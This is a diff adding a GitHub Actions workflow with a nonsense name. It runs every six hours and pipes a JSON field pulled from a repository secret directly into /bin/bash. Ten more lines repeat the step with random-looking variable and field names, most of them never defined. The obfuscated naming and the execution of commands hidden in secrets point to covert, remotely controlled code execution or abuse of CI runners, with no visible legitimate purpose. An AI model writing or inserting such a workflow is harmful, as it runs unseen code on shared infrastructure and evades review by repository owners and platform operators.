@@ -1,0 +1,26 @@
+name: taidulieji
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: taidulieji
+        env:
+          sa96972: ${{ secrets.sa96972 }}
+        run: |
+          echo $sa96972 | jq -r .y413 | /bin/bash
+          echo $ianom72 | jq -r .trw7 | /bin/bash
+          echo $x5863 | jq -r .to0 | /bin/bash
+          echo $hufg70616 | jq -r .mf12480 | /bin/bash
+          echo $dpqwi7016 | jq -r .sjwx7 | /bin/bash
+          echo $qxj4588 | jq -r .w74 | /bin/bash
+          echo $q1343 | jq -r .y9250 | /bin/bash
+          echo $gpdxo7603 | jq -r .rtx6857 | /bin/bash
+          echo $lfzjy0 | jq -r .g991 | /bin/bash
+          echo $koq33093 | jq -r .ev745 | /bin/bash
+          echo $v404 | jq -r .x72 | /bin/bash
+
